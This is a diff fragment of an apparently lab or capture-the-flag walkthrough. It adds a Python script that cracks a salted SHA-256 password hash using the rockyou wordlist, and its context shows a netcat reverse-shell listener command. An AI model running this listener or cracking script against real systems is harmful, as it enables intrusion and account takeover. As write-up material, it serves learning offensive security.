@@ -49,6 +49,22 @@ nc -lvnp 4444
 ```
 ![nc](screenshots/nc-reverse.png)
 
+
+![wackypass](screenshots/wackypass.png)
+```
+import hashlib
+
+target = "32940defd3c3ef------------------------4f8a503ca"
+
+with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
+    for line in f:
+        pw = line.strip()
+        h = hashlib.sha256((pw + "WingFTP").encode()).hexdigest()
+        if h == target:
+            print("FOUND:", pw)
+            break
+```
+
 # 🔎 Phase 2 – Foothold Analysis
 
 The system exposes a backup/restore mechanism:
